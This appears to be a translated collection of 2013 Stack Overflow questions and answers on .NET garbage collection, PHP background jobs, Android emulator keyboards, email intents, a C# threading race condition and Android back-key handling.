> 标签：c#, .net, garbage-collection

我在我的应用程序中使用 3-rd 方库，其中 GC.Collect() 方法通常被显式调用。
问题是它会产生死锁（这是显式调用 gc 的众所周知的问题）。

如何配置我的应用程序 (app.config) 使其忽略 GC.Collect()？

PS：我知道如何在 Java 中执行此操作（通过使用 -XX:+DisableExplicitGC 标志），
但我不知道如何在 .Net 中执行此操作。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:30:35.363

您不能在 C#/.Net 中关闭 GC。

但是，您可以告诉它不要在单独的线程中运行，这*可能*会对您有所帮助：

[http://msdn.microsoft.com/en-us/library/at1stbec%28v=vs.100%29.aspx](http://msdn.microsoft.com/en-us/library/at1stbec%28v=vs.100%29.aspx)

但是有没有办法让第三方库的供应商修复他们的烂代码？

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-27T12:44:22.520

我不知道有什么方法可以“忽略”对 GC.Collect() 的调用。有一些可用的配置选项，但我怀疑它们会解决您的死锁问题：

```
<configuration>
    <runtime>
        <gcServer enabled="true|false"/>
        <gcConcurrent enabled="true|false"/>
    </runtime>
</configuration> 
```

它们基本上会切换垃圾收集模式，但不会禁用对 GC.Collect() 的调用。

MSDN：[gcServer](http://msdn.microsoft.com/en-us/library/ms229357%28v=vs.100%29.aspx)，[gcConcurrent](http://msdn.microsoft.com/en-us/library/yhwwzef8%28v=vs.100%29.aspx)。

我认为调查为什么这会在您的应用程序中产生死锁会更明智。出于某种原因，第 3 方库（哪个库？）可能正在调用 GC.Collect()。也许您可以提供更多详细信息？

# php - 在 apache 和 os 之间平衡 php 脚本的权重

> ID：15111991
> 
> 赞同：4
> 
> 时间：2013-02-27T12:19:08.250
> 
> 标签：php, task

我想通过让它在操作系统而不是 Apache 上运行来平衡 Web 应用程序上的庞大进程。我可以通过 shell 执行该过程来做到这一点，但是，我认为在这种情况下也能获得其他人的意见。这是场景；

1.  用户登录到应用程序
2.  点击流程
3.  继续在服务器上处理，同时让用户执行他/她的正常活动。注意：**用户不应该被进程中断，应该是一个并行进程。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:24:05.450

考虑在将连续运行的服务器上启动单独的进程，从 PHP 脚本接收工作单元，执行它们并返回结果。PHP脚本和这个过程可能会使用数据库来交换工作单元，所以当PHP有一些工作时，它会在数据库中插入工作描述。当单独的进程准备好工作时，它会在数据库中查询待处理的工作单元，在数据库中将它们标记为正在处理。稍后，处理完成，它将数据库中的工作单元标记为已完成，并将处理结果附加到它。

# android - Android 模拟器：PC 键盘键不匹配

> ID：15111995
> 
> 赞同：0
> 
> 时间：2013-02-27T12:19:18.500
> 
> 标签：android, android-emulator, keyboard

有没有办法让我在我的模拟 android 设备上使用我的电脑键盘，但把钥匙放在正确的地方？目前，“ **QWERTY** ”最终成为“ **',.pyf** ”

是否有解决方法（除了使用屏幕键盘）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:06:23.737

Yes you can use enter your information using your PC keyboard . Make a new emulator or edit previous one & check that option which is "Hardware Keyboard Present".

# android - android 默认电子邮件客户端中的 html 支持

> ID：15111996
> 
> 赞同：3
> 
> 时间：2013-02-27T12:19:19.957
> 
> 标签：android

Android Default Email Client 是否支持 html 内容？有任何想法吗 ？我正在使用这样的。

```
int_email.setType("*/*");
int_email.putExtra(Intent.EXTRA_TEXT, Html.fromHtml(message)) ; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:35:10.557

您可以将类型设置为`plain/text`并直接传递您的消息

```
int_email.setType("plain/text");
int_email.putExtra(Intent.EXTRA_TEXT, message) ; 
```

# c# - 如何在旧线程完成之前生成新线程时停止发生 c#2.0 竞争条件？

> ID：15111997
> 
> 赞同：1
> 
> 时间：2013-02-27T12:19:21.070
> 
> 标签：c#, multithreading, c#-2.0, race-condition

我正在实现一个打印机队列来处理 c#2.0 中的 GDI 转换。要处理的作业由主线程添加，主线程为每台打印机设置一个线程来处理这些作业。完成所有作业后，打印线程将等待五秒钟以等待更多作业到期。

然后创建一个新线程，下次传递打印作业时。重要的是每台打印机只有一个线程以保持作业按顺序排列。

不幸的是，当线程到期时添加打印作业时似乎存在竞争条件 - Thread.IsAlive 可以在作业完成处理后为真。

**我可以防止这种情况发生吗？**

简化版：

```
private Thread _processor;
readonly private AutoResetEvent _newPrintItemAdded = new AutoResetEvent(true);
readonly ThreadSafeQueueWrapper<IPrintItem> _printingQueue = new ThreadSafeQueueWrapper<IPrintItem>(5);

public void Add(IPrintItem item)
{
    _printingQueue.Enqueue(item);

    //Resume processing thread if waiting.
   _newPrintItemAdded.Set();

   StartProcessorIfNeeded();
 }

public void StartProcessorIfNeeded()
{
    if (_processor != null && _processor.IsAlive) return;

    _processor = new Thread(RunThread)

    _processor.Start();
}

public void RunThread()
{
    //timeout if no items added to queue
    while (_newPrintItemAdded.WaitOne(5000))
    {
        ProcessQueueItems();
    }
      //Thread is alive here, but won't process any more items
}
private void ProcessQueueItems()
{
   // get the print job off the queue
   IPrintItem currentPrinter;
   while (_printingQueue.TryDequeue(out currentPrinter))
   {
      currentPrinter.Print();
   }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:24:11.983

只需等待旧线程退出即可。不要使用池化解决方案，`IsAlive`因为它们很少起作用。

```
if (_processor != null) _processor.Join(); 
```

# android - Android Back键循环焦点而不是返回到以前的活动

> ID：15111999
> 
> 赞同：2
> 
> 时间：2013-02-27T12:19:29.993
> 
> 标签：android, listview, back, searchview

我有这个布局

![在此处输入图像描述](../Images/850f39ab9651a113917d25de8b638cba.png)

两个 SearchView 小部件
一个 ListView

当我按下 android 后退键时，焦点会在过滤框和搜索框之间循环。
我想回到我以前的活动，但我做不到，因为后退键只能从一个盒子转到另一个盒子。
如何获得后退按键事件？

这段代码甚至没有被调用

```
@Override
public void onBackPressed() {
    setResult(Activity.RESULT_CANCELED);
    super.onBackPressed();   
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:58:17.727

问题肯定出在 SearchView 小部件及其对焦点/后键的处理上。
我将 SearchViews 更改为 EditTexts
我将 QueryTextListeners 更改为 TextWatchers
并且......瞧！

现在调用 onBackPressed() 并且活动可以返回到其先前的调用者。

![在此处输入图像描述](../Images/71e1f7b37933419058b249b993b6e016.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:28:25.070

您可以覆盖活动的 onBackPressed() 方法来执行您想要在按下后退键时执行的任何工作，例如

您可以在后退键按下时调用以前的活动......比如，

```
@override
public void onBackPressed ()
{
  Intent intent = new Intent(CurrentActivity.this, PreviousActivity.class);
  startActivity(intent);
  finish();

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:29:37.600

我总是遇到麻烦`onBackPressed`。您应该尝试使用`onKeyDown`or `onKeyUp`。

```
@Override
public boolean onKeyDown(int keyCode, KeyEvent event)  {
    if (keyCode == KeyEvent.KEYCODE_BACK && event.getRepeatCount() == 0) {
        // do something on back.
        return true;
    }

    return super.onKeyDown(keyCode, event);
} 
```